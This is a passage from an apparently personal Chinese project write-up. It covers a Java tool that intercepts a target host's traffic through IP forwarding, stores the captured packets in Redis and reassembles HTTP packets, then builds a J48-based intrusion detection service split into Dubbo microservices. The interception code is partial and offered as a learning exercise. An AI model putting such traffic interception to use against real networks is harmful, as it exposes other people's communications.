![image-20210329192456978](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329192456978.png)

本地主机IP转发开启成功，继续测试：在目标主机上`ping www.baidu.com`，抓到一个从网关发到目标主机的ICMP数据包，我们把它转存入Redis：

![image-20210329193000045](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329193000045.png)

至此基本的攻击算是成功了。

为了后面的数据包分析功能，我决定把数据包存在redis的list结构中，list集合的名称按`batch_id`命名，list中的value就是每个序列化后的数据包实体。

开放攻击，查看前端数据统计，成功抓到了许多数据包。但是很明显有一个问题：只有下行的数据包被抓到了，上行的数据包没有被抓到。

![image-20210329204233419](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329204233419.png)

我感觉是本地主机开了IP转发的原因，网卡在接收到目标主机访问百度的数据包后，进行IP转发，把源MAC地址修改为了本地主机的MAC地址，然后将数据包转发给网关，所以当数据包的MAC地址为本地主机的MAC地址时，本程序将其过滤掉了。看看问题代码:

```java
//如果这个数据包的源IP地址是目标主机的IP地址，那么说明是上行链路的数据包
if(ipPacket.src_ip.getHostAddress().equals(config.getDestIp())){
  //如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的数据包，需要忽略
  if(ipPacket.datalink instanceof EthernetPacket){
    EthernetPacket eth = (EthernetPacket) ipPacket.datalink;
    String macFromCap = eth.getSourceAddress();
    if(macFromCap.equalsIgnoreCase(config.getDestMac())){//卡在这了
      savePacket(ipPacket, true);
    }
  }
  forward(ipPacket, gateMACBT);
}
```

将MAC地址的限制放开，因为在外层if逻辑中已经明确判断出IP地址是目标主机的IP地址了，那么就不用MAC地址过滤了，把最内层if逻辑删除。重新抓包：抓到了上行链路的数据包，基本上是ping 1个，回应2个。

![image-20210329213112283](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329213112283.png)



#### 5.5.3 停止攻击

点击attack stop按钮后，会向服务器发送请求`/attack/stopAttack`。将标识位`attacking`置为`false`，并返回`batch_id`到前端。前端随即将`batch_id`作为参数向服务器发起请求`analyse/analysisByBatchId?batchId=1`，开始分析数据包。





### 5.6 数据包分析

所有被抓取的数据包都被封装到名为`CapturedXXXPacket`的pojo类中，并序列化到redis。当服务端接收到`analysisByBatchId`请求后，会根据批次读出`CapturedXXXPacket`数据，然后对数据包进行分析。以TCP包为例，在分析过程中会将HTTP和HTTPS包从其他的TCP包中过滤出来，另行存放。假设当前在分析一个HTTP包:

1. 首先根据端口号过滤，源或者目地端口为80端口的数据包留下
2. 然后将TCP的ACK号作为Key，将TCP报文段重组，通过`appendPacket`实现
3. 最后将所有有效的HTTP包封装为`AnalyzedHttpPacket`并序列化到redis中。

主要代码如下：

```java
private long analysisHttp(Integer batchId){
  this.analyzing = true;
  List<CapturedTCPPacket> fromList = (List<CapturedTCPPacket>) redisMapper.getFromList(AttackKey.cap_packet, "batch_id" + batchId + "_TCP_list", CapturedTCPPacket.class);
  HttpPacketFilter httpPacketFilter = new HttpPacketFilter();
  Map<Long, IAnalysisRealm> analysisRealmMap = new HashMap<>();
  long size = 0;
  for (CapturedTCPPacket tcpCapturedPacket : fromList) {
    TCPPacket tcpPacket = tcpCapturedPacket.getPacket();
    //根据端口号判断是否是HTTP协议
    if(!httpPacketFilter.filter(tcpPacket)){

      if (tcpPacket.getData() != null && tcpPacket.getData().length > 0) {
        size++;
        //根据TCP包的ACK号作为Key
        if (!analysisRealmMap.containsKey(tcpPacket.getAckNum())) {
          HttpAnalysisRealm httpAnalysisRealm = new HttpAnalysisRealm();
          httpAnalysisRealm.initPacket(tcpCapturedPacket.getBatchId(), tcpCapturedPacket.isUpStream(), tcpPacket);
          analysisRealmMap.put(tcpPacket.getAckNum(), httpAnalysisRealm);
        } else {
          analysisRealmMap.get(tcpPacket.getAckNum()).appendPacket(tcpPacket);
        }
      }
    }
  }

  saveRealmPackets(analysisRealmMap, batchId, new AnalyzedHttpPacket());
  this.analyzing = false;
  return size;
}
```

其他数据包的处理类似，不再赘述。

### 5.7 前端数据包可视化

在前端设置到过滤条件后，点击Filter按钮，提交post请求`/analyze/filterPackets`到服务器。

![Snip20210406_157](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/Snip20210406_157.png)

服务端处理请求，解析参数。先从redis中按照batchId查询出数据包，然后根据过滤条件过滤，最终返回数据包。实际上应当以过滤条件作为查询语句去数据库中查询，这样能够减少数据库的查询时间并减少网络通信开销，在高并发场景下提高效率。这里用redis，没办法特别自由地查询数据。

查询后的结果如下：

![image-20210406204426228](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210406204426228.png)







## 6. 入侵检测

接下来将在以上项目的基础上，实现简单的入侵检测系统。

入侵检测一共分为四个步骤：

1. **抓取数据包**：一般的IDS通常可以挂接在网关上，通过连接集线器或者分路器，把经由网关的数据包同样转发到IDS上。在本场景下，并无上述硬件条件，因此就按上一节中的方法来捕获数据包。
2. **数据包分组**：将数据包先按设备分组，再按时间戳分组。具体就是先按源IP地址分组，在同个源IP分组内按捕获的时间窗口分组，比如10秒内的数据包放在一组，下个10秒的数据包放在一组。
3. **特征提取**：从数据包中提取有状态特征和无状态特征。
   1. 无状态特征：
      1. Packet Size：通常DoS攻击的数据包都很小，例如SYN泛洪
      2. 包间间隔：异常流量通常是集中式的。包间间隔的特征可以直接将时间差作为特征，也可以将时间差的差分作为特征。
      3. 协议：正常流量的协议是较为丰富的，异常流量通常TCP的包相当多。
   2. 有状态特征：
      1. 带宽：统计10秒窗口内的平均带宽。
      2. 目地IP地址：如果经常出现新的目的IP地址，很有可能是遭受了攻击。统计两个时间窗口内目的IP地址的变化作为特征。

4. **二分类**：将分类器的输出结果作为是否遭受攻击的依据。
   1. KNN
   2. LSVM
   3. 决策树
   4. 随机森林

接下来要解决几个问题：

1. 数据集如何获取？
2. 入侵检测服务在哪里实现？

首先关于入侵检测服务如何实现的问题，有两个解决方案：

1. 直接在同一个服务端实现，后台开一个线程定时从数据库中读数据包，然后分析。
2. 划分微服务，用Dubbo实现。



数据集采用KDD cup 1999数据集，关于该数据集的详细分析见[链接](https://blog.csdn.net/qq_38384924/article/details/97128744)。

主要用j48 tree来实现分类器，将训练好的模型保存在web端，便于读取，训练过程略了，模型文件见src/model目录。





## 7. 微服务拆分

用dubbo作为RPC框架，zookeeper作为注册中心，将数据包分析服务、入侵检测服务、邮件发送服务拆分出来，通过dubbo注册到zookeeper上，实现远程调用。

在使用dubbo的时候，需要注意spring-cloud版本和spring-boot版本的对应关系。建议在创建Spring-boot项目的时候，使用阿里的镜像源创建，然后勾选spring-cloud-alibaba中的dubbo组件，这样就无需再处理版本对应，创建出来的就是合适的版本。

我的springboot版本是`2.3.7-RELEASE`，Springcloud版本是`2.2.1-RELEASE`，在使用时报错：

```shell
cannot access its superinterface org.springframework.cloud.openfeign.Targeter
```

将`spring-boot-devtools`依赖删除即可，这应该是官方的问题。

### 模块拆分

**api模块**：创建一个api模块（普通maven工程），将服务接口、服务模型、服务异常等均放在 API 包中。

**provider模块**：每一种服务对应一个provider模块（Springboot工程）：

* analyze-service-provider：数据包分析模块
* ids-service-provider：入侵检测模块
* mail-service-provider：邮件发送模块

**服务调用**：在backend模块中调用上述服务。



### 入侵检测服务

首先在api模块中编写接口`IIDSService`:

```java
package com.hyc.interfaces;

/**
 * @author kol Huang
 * @date 2021/4/12
 */
public interface IIDSService {

  boolean isAttacked();

}
```

在analyze-service-provider模块中编写IIDSService接口的实现类`IDSServiceImpl`，代码的大体框架如下所示：

```java
package com.hyc.idsserviceprovider.impl;

import com.hyc.interfaces.IIDSService;
import org.apache.dubbo.config.annotation.Service;
import weka.classifiers.trees.J48;
import weka.core.Instance;
import weka.core.Instances;
import weka.core.SerializationHelper;
import weka.core.converters.ConverterUtils;
import weka.experiment.InstanceQuery;

/**
 * @author kol Huang
 * @date 2021/4/12
 */
@Service
public class IDSServiceImpl implements IIDSService {

  int[] table = new int[41];

  @Override
  public boolean isAttacked() {
    //判断是否被攻击
    //1. 从mysql中查询验证集
    //        ConverterUtils.DataSource source = null;
    Instances data = null;
    try {
      InstanceQuery query = new InstanceQuery();
      query.setUsername("root");
      query.setPassword("123456");
      //读100条，先处理
      query.setQuery("select * from features");
      data = query.retrieveInstances();
    } catch (Exception e) {
      e.printStackTrace();
    }
    //2. 读取模型
    J48 j48Tree = null;
    try {
      j48Tree = (J48) SerializationHelper.read("src/model/j48.model");
    } catch (Exception e) {
      e.printStackTrace();
    }
    //3. 多分类
    for (Instance datum : data) {
      try {
        int type = (int) j48Tree.classifyInstance(datum);
        table[type]++;
      } catch (Exception e) {
        e.printStackTrace();
      }
    }
    //4. 统计判别：当此次分析过程中，有百分之80的数据记录被判别为攻击流量，那么就说明发生了攻击



    return false;
  }
}

```

这里有些粗糙了，应当统计所有的攻击类型，然后封装到一个DTO里返回，这样可以在邮件服务里面添加攻击的详细信息。